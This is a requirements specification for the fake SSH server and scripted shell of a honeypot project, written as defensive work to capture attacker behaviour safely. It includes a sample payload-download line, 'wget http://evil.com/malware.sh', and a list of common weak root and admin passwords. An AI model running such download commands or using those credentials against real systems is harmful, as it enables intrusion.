# Requirements Document

## Introduction

The `trap-core` feature implements the fake SSH server and scripted Ghost Shell for Haunted Honeypot. It accepts attacker connections on a configurable port, authenticates using a weak-credential list, and presents a believable fake Linux environment (a decommissioned 2009 municipal records server, "records-srv-09"). Every login attempt, command, and generated response is logged as structured events to a per-session JSON Lines file for later ingestion by the Brain. Attacker input is never executed; all filesystem effects are in-memory per session.

## Glossary

- **Trap**: The fake SSH server component in `trap/` that listens for incoming SSH connections.
- **Ghost_Shell**: The fake interactive shell in `trap/ghost/` that processes attacker commands and produces simulated responses.
- **Fake_Filesystem**: The in-memory virtual filesystem seeded per session from a template, representing the "records-srv-09" persona.
- **Session**: A single attacker SSH connection from connection open to close, identified by a unique session ID.
- **Entity**: An attacker identified by IP address (product vocabulary for "attacker / IP").
- **Sighting**: A single attack session (product vocabulary for "attack session / tape").
- **Event**: A structured log record of kind `login_attempt`, `command`, `response`, or `download_attempt`, emitted during a Session.
- **Session_Log**: A JSON Lines file written to disk (one per Session) containing all Events, used as the handoff point to the Brain.
- **Credential_List**: A configurable list of accepted username/password pairs representing known weak credentials (e.g. `root/admin123`, `root/123456`, `admin/admin`).
- **LLM_Interface**: A clean Python interface (abstract base class) in `trap/ghost/llm.py` that the Ghost Shell calls for unknown commands; the scripted implementation always returns `command not found` until a later spec provides a real LLM backend.
- **Host_Key**: The SSH server's RSA/Ed25519 private key, generated once and persisted to a mounted volume.
- **MOTD**: Message of the day displayed to the Entity after a successful login.
- **Idle_Timeout**: Maximum seconds a Session may remain open without receiving any input from the Entity.
- **Max_Session_Duration**: Maximum total seconds a Session may remain open regardless of activity.
- **Max_Input_Line**: Maximum number of characters accepted from a single input line from the Entity.

---

## Requirements

### Requirement 1: SSH Server Startup and Configuration

**User Story:** As a honeypot operator, I want the Trap to start up using environment-variable configuration and persist its host key, so that the server presents a consistent identity across restarts without manual key management.

#### Acceptance Criteria

1. THE Trap SHALL read its listening port from the `TRAP_PORT` environment variable, defaulting to `2222` when the variable is absent.
2. WHEN the Trap starts and no Host_Key file exists at the configured key path, THE Trap SHALL generate a new Ed25519 Host_Key and write it to the mounted volume path specified by the `TRAP_HOST_KEY_PATH` environment variable.
3. WHEN the Trap starts and a Host_Key file already exists at the configured key path, THE Trap SHALL load that Host_Key without generating a new one.
4. THE Trap SHALL read the Credential_List from the file path specified by the `TRAP_CREDENTIAL_FILE` environment variable; the file format is one `username:password` pair per line.
5. THE Trap SHALL run as a non-root OS user inside its container.
6. WHEN the `TRAP_PORT`, `TRAP_HOST_KEY_PATH`, or `TRAP_CREDENTIAL_FILE` environment variable contains an invalid value, THE Trap SHALL log a descriptive startup error and exit with a non-zero status code.

---

### Requirement 2: Password Authentication and Login Attempt Logging

**User Story:** As a honeypot operator, I want the Trap to accept only weak-credential logins and record every attempt, so that I can study which credentials attackers try without granting access to real systems.

#### Acceptance Criteria

1. WHEN an Entity submits a username and password that match an entry in the Credential_List, THE Trap SHALL accept the authentication and open a Session.
2. WHEN an Entity submits a username and password that do not match any entry in the Credential_List, THE Trap SHALL reject the authentication without revealing the reason.
3. THE Trap SHALL record a `login_attempt` Event for every authentication attempt (accepted or rejected) containing: session ID, source IP, source port, username, password, SSH client version string, UTC timestamp, and success (`true` if authentication was accepted, `false` if rejected).
4. THE Trap SHALL support a minimum of 50 concurrent Sessions without blocking the event loop.
5. IF the Trap encounters an error writing a `login_attempt` Event to the Session_Log, THEN THE Trap SHALL log the error to its own process log and continue accepting connections.
6. THE Trap SHALL ship a default credential file bundled in the repository containing approximately 30 common weak username/password pairs. The default pairs SHALL include combinations from the following: usernames `root`, `admin`, `ubuntu`, `pi`, `user`; passwords `123456`, `password`, `admin`, `root`, `12345678`, `qwerty`; and the pairs `root/root`, `admin/admin`, `pi/raspberry`, `ubuntu/ubuntu`, `user/user`.
7. WHEN the `TRAP_ACCEPT_AFTER_ATTEMPTS` environment variable is set to a positive integer N, THE Trap SHALL accept any password on the Nth or subsequent authentication attempt from the same source IP address within a rolling one-hour window, in addition to the normal Credential_List matching. The attempt counter for a source IP SHALL reset one hour after the first recorded attempt from that IP within the current window.

---

### Requirement 3: Session Lifecycle and Limits

**User Story:** As a honeypot operator, I want sessions to be bounded in time and input size, so that a single persistent attacker cannot exhaust server resources.

#### Acceptance Criteria

1. THE Trap SHALL enforce an Idle_Timeout of the duration specified by the `TRAP_IDLE_TIMEOUT_SECONDS` environment variable, defaulting to `300` seconds.
2. WHEN a Session has received no input from the Entity for the Idle_Timeout duration, THE Trap SHALL close that Session and write a `session_end` Event to the Session_Log.
3. THE Trap SHALL enforce a Max_Session_Duration of the duration specified by the `TRAP_MAX_SESSION_SECONDS` environment variable, defaulting to `1800` seconds.
4. WHEN a Session has been open for the Max_Session_Duration, THE Trap SHALL close that Session and write a `session_end` Event to the Session_Log regardless of recent Entity activity.
5. THE Trap SHALL discard any input line from an Entity that exceeds `Max_Input_Line` characters (4096) and SHALL send the Entity a `bash: line too long` message without closing the Session.
6. WHEN a Session is closed for any reason, THE Trap SHALL flush and close the Session_Log file.

---

### Requirement 4: Ghost Shell Persona and MOTD

**User Story:** As a honeypot operator, I want the fake shell to present a consistent "records-srv-09" server persona, so that the deception is believable and the attacker spends time exploring rather than leaving.

#### Acceptance Criteria

1. WHEN a Session is opened successfully, THE Ghost_Shell SHALL send the Entity the MOTD before presenting a shell prompt.
2. THE Ghost_Shell SHALL include in the MOTD: the hostname `records-srv-09`, a reference to the decommissioned municipal records purpose of the server, and a lore hint about a missing caretaker.
3. THE Ghost_Shell SHALL present a shell prompt after the MOTD and after each command response. The prompt format SHALL be `[username@records-srv-09 <display_cwd>]#` for sessions authenticated as `root` and `[username@records-srv-09 <display_cwd>]$` for all other users. THE Ghost_Shell SHALL substitute `~` for the authenticated user's home directory prefix in `<display_cwd>` (e.g. when the authenticated user is `root` and the current working directory is `/root`, `<display_cwd>` is `~`; when the current working directory is `/root/docs`, `<display_cwd>` is `~/docs`).
4. THE Fake_Filesystem SHALL be seeded per Session from a template that includes at minimum: a `/vault` directory, a `/home/caretaker/` directory, and the file `/home/caretaker/last_words.txt` containing flavour text.
5. THE Fake_Filesystem SHALL be independent per Session; changes made by one Entity SHALL NOT be visible to any other concurrent Session.

---

### Requirement 5: Scripted Command Handlers

**User Story:** As a honeypot operator, I want the Ghost Shell to respond plausibly to common Linux commands, so that the fake environment remains convincing long enough to capture meaningful attacker behaviour.

#### Acceptance Criteria

1. WHEN the Entity runs `pwd`, THE Ghost_Shell SHALL return the current working directory path within the Fake_Filesystem.
2. WHEN the Entity runs `cd <path>`, THE Ghost_Shell SHALL change the current working directory within the Fake_Filesystem to the specified path; IF the path does not exist, THEN THE Ghost_Shell SHALL return `bash: cd: <path>: No such file or directory`.
3. WHEN the Entity runs `ls` or `ls -la`, THE Ghost_Shell SHALL list the contents of the current working directory from the Fake_Filesystem; `ls -la` SHALL include permissions, owner, size, and modification time columns using plausible static values.
4. WHEN the Entity runs `cat <file>`, THE Ghost_Shell SHALL return the contents of that file from the Fake_Filesystem; IF the file does not exist, THEN THE Ghost_Shell SHALL return `cat: <file>: No such file or directory`.
5. WHEN the Entity runs `whoami`, THE Ghost_Shell SHALL return the username used to authenticate the Session.
6. WHEN the Entity runs `id`, THE Ghost_Shell SHALL return a plausible `uid=0(root) gid=0(root) groups=0(root)` string when the authenticated username is `root`, and a non-root equivalent otherwise.
7. WHEN the Entity runs `uname -a`, THE Ghost_Shell SHALL return a plausible Linux kernel version string consistent with a 2009-era server (e.g. `Linux records-srv-09 2.6.18-92.el5 #1 SMP ...`).
8. WHEN the Entity runs `hostname`, THE Ghost_Shell SHALL return `records-srv-09`.
9. WHEN the Entity runs `echo <args>`, THE Ghost_Shell SHALL return the provided arguments as a single line of output, treating shell variable expansion as literal text (e.g. `$PATH` is returned as the string `$PATH`).
10. WHEN the Entity runs `mkdir <path>`, THE Ghost_Shell SHALL create the specified directory in the Fake_Filesystem; IF the path already exists, THEN THE Ghost_Shell SHALL return `mkdir: cannot create directory '<path>': File exists`.
11. WHEN the Entity runs `touch <file>`, THE Ghost_Shell SHALL create an empty file at the specified path in the Fake_Filesystem if it does not already exist, or update its modification timestamp if it does.
12. WHEN the Entity runs `rm <file>` or `rm -rf <path>`, THE Ghost_Shell SHALL remove the specified file or directory from the Fake_Filesystem; IF the target does not exist, THEN THE Ghost_Shell SHALL return `rm: cannot remove '<path>': No such file or directory`.
13. WHEN the Entity runs `history`, THE Ghost_Shell SHALL return a numbered list of commands issued during the current Session.
14. WHEN the Entity runs `chmod <mode> <path>`, THE Ghost_Shell SHALL update the stored permission string for that path in the Fake_Filesystem without executing any real OS call; IF the path does not exist, THEN THE Ghost_Shell SHALL return `chmod: cannot access '<path>': No such file or directory`.
15. WHEN the Entity runs `exit`, THE Ghost_Shell SHALL close the Session cleanly and write a `session_end` Event to the Session_Log.

---

### Requirement 6: Download Simulation (wget / curl)

**User Story:** As a honeypot operator, I want wget and curl to appear functional without fetching anything, so that I can capture attacker download attempts for threat intelligence without allowing real file retrieval.

#### Acceptance Criteria

1. WHEN the Entity runs a command beginning with `wget` or `curl`, THE Ghost_Shell SHALL record a `download_attempt` Event containing the session ID, the full command string, the first URL argument parsed from the command, and a UTC timestamp.
2. WHEN the Entity runs `wget <url>`, THE Ghost_Shell SHALL print output consistent with a successful download including plausible progress output (e.g. percentage complete, transfer speed, and file size) and SHALL NOT fetch the URL or write any file to the real filesystem.
3. WHEN the Entity runs `curl <url>`, THE Ghost_Shell SHALL print output consistent with a successful transfer including plausible transfer statistics and SHALL NOT fetch the URL or write any file to the real filesystem.
4. WHEN a simulated `wget` or `curl` download completes, THE Ghost_Shell SHALL create a small fake empty file in the Fake_Filesystem at the current working directory using the filename derived from the last path segment of the URL (e.g. `wget http://evil.com/malware.sh` creates `malware.sh` in the current working directory).
5. IF the Entity attempts to execute a file path that resembles a previously "downloaded" filename (e.g. `./<filename>`), THEN THE Ghost_Shell SHALL return `Segmentation fault (core dumped)`.
6. THE Ghost_Shell SHALL NOT make any outbound network request as a result of a `wget` or `curl` command.

---

### Requirement 7: Unknown Command Handling and LLM Interface

**User Story:** As a honeypot operator, I want unknown commands to fall through to a defined LLM interface, so that the Ghost Shell remains extensible for an LLM-powered fallback without requiring a working LLM in this phase.

#### Acceptance Criteria

1. WHEN the Entity runs a command that does not match any scripted handler, THE Ghost_Shell SHALL call the `LLM_Interface.respond(session_context, command)` method.
2. THE LLM_Interface SHALL be defined as a Python abstract base class in `trap/ghost/llm.py` with at minimum the method signature `async def respond(self, session_context: SessionContext, command: str) -> str`.
3. THE Ghost_Shell SHALL ship with a `ScriptedFallback` concrete implementation of the LLM_Interface that returns `bash: <cmd>: command not found` for any input, where `<cmd>` is the first whitespace-delimited token of the command string.
4. THE Ghost_Shell SHALL use the `ScriptedFallback` as the active LLM_Interface unless a different implementation is injected at startup via the `TRAP_LLM_BACKEND` environment variable.
5. WHEN the LLM_Interface raises an exception, THE Ghost_Shell SHALL return `bash: <cmd>: command not found` to the Entity and log the exception to the process log without closing the Session.

---

### Requirement 8: Command Chaining (`;`, `&&`, `|`)

**User Story:** As a honeypot operator, I want minimal command chaining to work plausibly, so that attackers using one-liner scripts are not immediately undeceived by a broken shell.

#### Acceptance Criteria

1. WHEN the Entity's input contains a `;` separator, THE Ghost_Shell SHALL split the input into individual command tokens on `;` and execute each token sequentially, returning concatenated output.
2. WHEN the Entity's input contains an `&&` separator, THE Ghost_Shell SHALL execute the left-hand command; WHEN the left-hand command produces no error output, THE Ghost_Shell SHALL execute the right-hand command; IF the left-hand command produces an error, THEN THE Ghost_Shell SHALL stop and return only the left-hand output.
3. WHEN the Entity's input contains a `|` separator, THE Ghost_Shell SHALL execute the left-hand command and pass its output as a plausible argument to the right-hand command using a best-effort simulation (exact pipe semantics are not required).
4. IF any command token in a chained input causes an unhandled exception in the Ghost_Shell, THEN THE Ghost_Shell SHALL log the exception and continue processing remaining tokens without closing the Session.
5. THE Ghost_Shell command-chaining parser SHALL NOT invoke any OS-level shell, subprocess, or interpreter at any point.

---

### Requirement 9: Event Logging

**User Story:** As a honeypot operator, I want all session activity written to a structured per-session log file, so that the Brain can ingest complete, reliable data without being coupled to the Trap's runtime.

#### Acceptance Criteria

1. THE Trap SHALL create one Session_Log file per Session at the path `<LOG_DIR>/<session_id>.jsonl`, where `LOG_DIR` is read from the `TRAP_LOG_DIR` environment variable.
2. THE Session_Log SHALL be written in JSON Lines format; each line SHALL be a valid JSON object conforming to the Event schema: `{ "session_id": str, "timestamp": ISO-8601 UTC str, "kind": "login_attempt" | "command" | "response" | "download_attempt" | "session_start" | "session_end", "payload": object, "generated_by": "scripted" | "llm" }`. The `session_start` Event payload SHALL include source IP, source port, and SSH client version string. The `session_end` Event payload SHALL include a `reason` field with one of: `exit`, `idle_timeout`, `max_duration`, `disconnect`, `log_error`.
3. WHEN the Ghost_Shell processes a command, THE Trap SHALL write a `command` Event and a corresponding `response` Event to the Session_Log before returning output to the Entity.
4. THE Trap SHALL write Events to the Session_Log in chronological order with no gaps between a `command` Event and its matching `response` Event.
5. IF the Session_Log file cannot be created or written, THEN THE Trap SHALL log the filesystem error to its process log and close the Session with an appropriate SSH error message rather than silently losing events.
6. THE Session_Log SHALL contain only attacker-supplied data and connection metadata; it SHALL NOT contain any data about legitimate users or the host system configuration.

---

### Requirement 10: Security Constraints

**User Story:** As a honeypot operator, I want to be certain that attacker input can never trigger real OS execution, so that the honeypot cannot be turned into a liability.

#### Acceptance Criteria

1. THE Ghost_Shell SHALL NOT import or call `subprocess`, `os.system`, `os.popen`, `pty`, `eval`, or `exec` anywhere in `trap/`.
2. THE Fake_Filesystem SHALL store all state in Python in-memory data structures; it SHALL NOT read from or write to the real filesystem except when writing Events to the Session_Log.
3. THE Trap SHALL NOT make outbound network requests except to the LLM API endpoint configured via `TRAP_LLM_API_URL`; the scripted fallback phase makes no outbound requests at all.
4. WHEN the Ghost_Shell receives input of any length or content, THE Ghost_Shell SHALL handle it without raising an unhandled exception.
5. THE Trap's Python source files in `trap/` SHALL pass `bandit` with no high-severity findings.

---

### Requirement 11: Property-Based Testing

**User Story:** As a honeypot operator, I want Hypothesis-driven property tests to prove the Ghost Shell's invariants hold for arbitrary input, so that correctness guarantees are mechanically verified rather than assumed.

#### Acceptance Criteria

1. THE Test_Suite SHALL include a property test verifying that for any string input of up to 4096 characters, the Ghost_Shell command dispatcher returns a string result without raising an exception.
2. THE Test_Suite SHALL include a property test verifying that after `mkdir <name>` succeeds in the Fake_Filesystem, a subsequent `ls` of the parent directory contains `<name>` (mkdir → ls round-trip).
3. THE Test_Suite SHALL include a property test verifying that after `rm <file>` succeeds in the Fake_Filesystem, a subsequent `cat <file>` returns an error string and does not return file contents (rm → cat round-trip).
4. THE Test_Suite SHALL include a property test verifying that no string input causes the Ghost_Shell to import or invoke `subprocess`, `os.system`, `os.popen`, `pty`, `eval`, or `exec` (no-execution invariant).
5. THE Test_Suite SHALL include a property test verifying that the Session_Log output for any sequence of commands is valid JSON Lines (each line parses as a JSON object with the required Event fields).
6. FOR ALL valid Event objects written by the Trap, serialising then deserialising the Event SHALL produce an equivalent object (round-trip property for the JSON Lines serialiser).
